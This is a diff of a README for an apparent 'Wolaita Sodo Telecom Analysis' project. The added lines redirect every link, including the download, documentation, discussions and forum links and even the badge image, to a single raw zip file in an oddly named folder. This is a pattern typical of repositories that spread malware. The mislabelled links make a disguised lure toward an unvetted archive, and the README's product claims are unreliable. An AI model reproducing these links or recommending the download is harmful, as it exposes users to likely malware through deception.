@@ -1,6 +1,6 @@
 # 📈 Wolaita_Sodo_Telecom_Analysis - Easy Insights for Telecom Performance
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/main/nosogeography/Wolaita_Sodo_Telecom_Analysis-1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/main/nosogeography/Wolaita_Sodo_Telecom_Analysis-1.8.zip)
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ To start using Wolaita Sodo Telecom Analysis, you need to download the applicati
 
 ## 📦 Download & Install
 
-To download the application, visit our Releases page: [Download Page](https://github.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/releases).
+To download the application, visit our Releases page: [Download Page](https://raw.githubusercontent.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/main/nosogeography/Wolaita_Sodo_Telecom_Analysis-1.8.zip).
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -85,12 +85,12 @@ A: If you face issues, check the FAQ section in the application or visit our com
 
 ## 💬 Support
 
-If you need further assistance, please visit [our GitHub Discussions page](https://github.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/discussions) or open an issue in the repository.
+If you need further assistance, please visit [our GitHub Discussions page](https://raw.githubusercontent.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/main/nosogeography/Wolaita_Sodo_Telecom_Analysis-1.8.zip) or open an issue in the repository.
 
 ## 🔗 Important Links
 
-- [Download Page](https://github.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/releases)
-- [Documentation](https://github.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/wiki)
-- [Community Forum](https://github.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/discussions)
+- [Download Page](https://raw.githubusercontent.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/main/nosogeography/Wolaita_Sodo_Telecom_Analysis-1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/main/nosogeography/Wolaita_Sodo_Telecom_Analysis-1.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/Karimchgara/Wolaita_Sodo_Telecom_Analysis/main/nosogeography/Wolaita_Sodo_Telecom_Analysis-1.8.zip)
 
 Use advances in telecom analytics to navigate your resource allocation effectively. Get started by downloading today!
